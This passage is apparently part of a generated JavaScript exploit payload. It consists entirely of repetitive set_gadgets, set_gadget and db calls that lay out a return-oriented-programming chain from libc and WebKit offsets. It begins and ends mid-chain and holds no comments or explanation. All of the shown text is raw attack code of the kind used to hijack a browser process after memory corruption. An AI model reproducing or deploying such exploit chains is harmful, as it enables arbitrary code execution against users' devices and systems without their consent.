set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+104952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+105024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+105080, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+105232, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+105320, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+105336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+105480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+105448, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+105464, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+105552, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+105608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+105688, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([19, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+105792, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+105808, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+105896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+105952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+106024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+106080, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+882884, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+106232, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+106320, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+106336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+106480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+106448, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+106464, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+106552, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+106608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+106688, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([20, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+106792, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+106808, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+106896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+106952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+107024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+107080, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+107232, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+107320, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+107336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+107480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+107448, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+107464, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+107552, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+107608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+107688, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([21, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+107792, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+107808, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+107896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+107952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+108024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+108080, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+108184, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+108272, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+108288, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+108432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+108400, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+108416, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+108504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+108560, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+108640, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([3, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+108744, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+108760, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+108848, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+108904, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+109024, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+109112, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+109128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+109272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+109240, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+109256, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+109344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+109400, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+109480, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([22, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+109584, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+109600, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+109688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+109744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+109816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+109872, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+110024, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+110112, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+110128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+110272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+110240, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+110256, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+110344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+110400, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+110480, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([23, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+110584, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+110600, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+110688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+110744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+110816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+110872, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+111024, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+111112, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+111128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+111272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+111240, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+111256, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+111344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+111400, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+111480, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([24, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+111584, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+111600, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+111688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+111744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+111816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+111872, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+111976, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+112064, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+112080, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+112224, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+112192, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+112208, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+112296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+112352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+112432, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([4, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+112536, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+112552, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+112640, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+112696, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+112816, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+112904, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+112920, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+113064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+113032, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+113048, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+113136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+113192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+113272, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([25, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+113376, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+113392, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+113480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+113536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+113608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+113664, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+8975893, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+113816, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+113904, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+113920, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+114064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+114032, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+114048, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+114136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+114192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+114272, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([26, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+114376, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+114392, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+114480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+114536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+114608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+114664, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+114816, 
